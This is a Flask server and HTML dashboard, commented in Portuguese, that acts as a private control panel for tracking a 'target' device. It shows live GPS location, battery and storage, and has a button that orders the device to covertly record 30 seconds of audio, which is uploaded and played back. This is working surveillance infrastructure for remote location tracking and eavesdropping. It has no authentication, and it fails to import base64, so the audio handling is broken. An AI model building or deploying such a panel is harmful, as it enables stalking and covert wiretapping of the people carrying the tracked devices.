import os
from flask import Flask, render_template_string, request, jsonify, send_from_directory

app = Flask(__name__)
db_dispositivos = {}

# Garante que a pasta temporária para salvar os arquivos de áudio físicos existe na Render
AUDIO_DIR = "/tmp/nexos_audios"
if not os.path.exists(AUDIO_DIR):
    os.makedirs(AUDIO_DIR)

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS CORE // PRIVATE PANEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #070f15; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
        .wrapper { max-width: 600px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
        .search-box { background: #0d1925; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .search-box p { font-size: 13px; color: #64748b; margin-bottom: 15px; }
        .search-box input { width: 100%; max-width: 300px; background: #070f15; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
        .search-box button { background: #38bdf8; color: #070f15; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #0d1925; padding: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        .info-box { background: #070f15; border: 1px solid #1e293b; padding: 10px; border-radius: 6px; }
        .info-box span { font-size: 11px; color: #64748b; display: block; text-transform: uppercase; }
        .info-box strong { font-size: 16px; color: #f1f5f9; }
        .map-container { width: 100%; height: 260px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
        .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
        .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 15px; }
        .audio-box { background: #070f15; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; text-align: center; }
        .btn-trigger-audio { background: #ea580c; color: #fff; font-weight: bold; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 12px; }
        .btn-trigger-audio:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); margin-top: 5px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header">
            <h1>NEXOS // PRIVATE TRACKING</h1>
        </div>

        <div class="search-box">
            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
            <form id="searchForm" method="POST">
                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-MOTO-ZETA" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar Sinal</button>
            </form>
        </div>
        
        {% if info_moto %}
            <div class="device-section">
                <div class="device-title">
                    <span>CONEXÃO ATIVA // {{ id_buscado }}</span>
                    <span class="status-tag">ONLINE</span>
                </div>
                <div class="info-grid">
                    <div class="info-box"><span>Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                    <div class="info-box"><span>Espaço Livre</span><strong id="txt_storage">{{ info_moto.storage }}</strong></div>
                    <div class="info-box"><span>Uptime</span><strong id="txt_uptime">{{ info_moto.uptime }}</strong></div>
                    <div class="info-box"><span>Sinal GPS</span><strong style="color: #38bdf8;">100% ESTÁVEL</strong></div>
                </div>
                
                <div id="map_private" class="map-container"></div>
                
                <a id="lnk_maps" href="https://www.google.com/maps/search/?api=1&query={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">
                    🗺️ Abrir no Google Maps
                </a>

                <div class="audio-box">
                    <button id="btn_audio" class="btn-trigger-audio" onclick="dispararGravacao()">🎙️ SOLICITAR ESCUTA DE 30S</button>
                    <audio id="audio_player" controls src="{{ '/get_audio/' + id_buscado if info_moto.has_audio else '' }}"></audio>
                    <div id="audio_status" style="font-size:11px; color:#64748b; margin-top:5px;">Nenhuma escuta ativa no momento.</div>
                </div>
            </div>

            <script>
                let lat = {{ info_moto.lat }};
                let lon = {{ info_moto.lon }};
                let lastAudioTimestamp = 0;
                
                const map = L.map('map_private', { zoomControl: false }).setView([lat, lon], 16);
                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                let marker = L.marker([lat, lon]).addTo(map);

                async function dispararGravacao() {
                    const btn = document.getElementById('btn_audio');
                    btn.disabled = true;
                    btn.innerText = "⏳ Gravando áudio remoto... Aguarde 35s";
                    await fetch('/api/ordem_audio/{{ id_buscado }}', { method: 'POST' });
                    setTimeout(() => {
                        btn.innerText = "🎙️ SOLICITAR ESCUTA DE 30S";
                        btn.disabled = false;
                    }, 38000);
                }

                setInterval(async () => {
                    try {
                        const response = await fetch('/api/status/{{ id_buscado }}');
                        if (response.ok) {
                            const data = await response.json();
                            document.getElementById('txt_bateria').innerText = data.battery + '%';
                            document.getElementById('txt_storage').innerText = data.storage;
                            document.getElementById('txt_uptime').innerText = data.uptime;
                            
                            const newPos = [parseFloat(data.lat), parseFloat(data.lon)];
                            marker.setLatLng(newPos);
                            map.panTo(newPos);
                            document.getElementById('lnk_maps').href = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
                            
                            // Verifica o carimbo de tempo do áudio para atualizar o player sem dar conflito
                            if (data.audio_timestamp && data.audio_timestamp !== lastAudioTimestamp) {
                                lastAudioTimestamp = data.audio_timestamp;
                                const player = document.getElementById('audio_player');
                                // Adiciona um parâmetro t para enganar o cache do navegador e forçar o recarregamento
                                player.src = "/get_audio/{{ id_buscado }}?t=" + lastAudioTimestamp;
                                player.load();
                                document.getElementById('audio_status').innerText = "✅ NOVA ESCUTA RECEBIDA! USE O PLAYER ACIMA.";
                                document.getElementById('audio_status').style.color = "#34d399";
                            }
                        }
                    } catch (e) {}
                }, 5000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None
    info_moto = None
    erro = None
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip()
        if id_buscado in db_dispositivos:
            info_moto = db_dispositivos[id_buscado]
        else:
            erro = "❌ IDENTIFICADOR NÃO ENCONTRADO."
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    if device_id in db_dispositivos:
        return jsonify(db_dispositivos[device_id]), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/api/ordem_audio/<device_id>', methods=['POST'])
def ordem_audio(device_id):
    if device_id in db_dispositivos:
        db_dispositivos[device_id]["comando_gravacao"] = True
        return jsonify({"status": "ordem_enviada"}), 200
    return jsonify({"status": "error"}), 404

# ROTA ESTÁTICA: Serve o arquivo físico de áudio diretamente da memória do servidor
@app.route('/get_audio/<device_id>')
def get_audio(device_id):
    filename = f"{device_id}.wav"
    if os.path.exists(os.path.join(AUDIO_DIR, filename)):
        return send_from_directory(AUDIO_DIR, filename, mimetype="audio/wav")
    return "No audio", 404

@app.route('/update', methods=['POST'])
def update():
    global db_dispositivos
    data = request.json
    if not data or 'device_id' not in data: return jsonify({"status": "error"}), 400
    device_id = data['device_id']
    
    if device_id not in db_dispositivos:
        db_dispositivos[device_id] = {"has_audio": False, "audio_timestamp": 0, "comando_gravacao": False}
        
    db_dispositivos[device_id]["battery"] = data.get("battery", "N/A")
    db_dispositivos[device_id]["storage"] = data.get("storage", "N/A")
    db_dispositivos[device_id]["uptime"] = data.get("uptime", "Ativo")
    db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
    db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
    
    # Se vier áudio, o servidor decodifica o Base64 e reconstrói o arquivo físico .wav real
    if data.get("audio_b64"):
        import time
        try:
            audio_bytes = base64.b64decode(data.get("audio_b64"))
            filepath = os.path.join(AUDIO_DIR, f"{device_id}.wav")
            with open(filepath, "wb") as f:
                f.write(audio_bytes)
            db_dispositivos[device_id]["has_audio"] = True
            db_dispositivos[device_id]["audio_timestamp"] = int(time.time())
        except Exception as e:
            print("Erro ao processar arquivo fisico de som:", e)
        
    checar_ordem = db_dispositivos[device_id].get("comando_gravacao", False)
    if checar_ordem:
        db_dispositivos[device_id]["comando_gravacao"] = False
        
    return jsonify({"comando_gravacao": checar_ordem}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
